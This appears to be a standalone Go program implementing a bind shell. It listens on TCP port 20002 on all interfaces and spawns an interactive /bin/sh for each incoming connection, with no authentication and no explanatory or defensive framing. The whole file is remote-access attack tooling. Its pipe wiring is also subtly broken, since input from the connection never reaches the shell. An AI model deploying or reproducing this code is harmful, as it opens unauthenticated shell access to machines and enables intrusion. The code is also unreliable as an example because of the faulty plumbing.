package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {
	log.Println("connected")
	defer conn.Close()
	cmd := exec.Command("/bin/sh", "-i")
	rp, wp := io.Pipe()
	cmd.Stdin = rp
	cmd.Stdout = wp
	go func() {
		_, err := io.Copy(conn, rp)
		if err != nil {
			log.Fatalln(err)
		}
	}()
	err := cmd.Run()
	if err != nil {
		log.Fatalln(err)
	}

}

func main() {
	listener, err := net.Listen("tcp", ":20002")
	if err != nil {
		log.Fatalln(err)
	}
	log.Println("listening on 0.0.0.0:20002")
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}
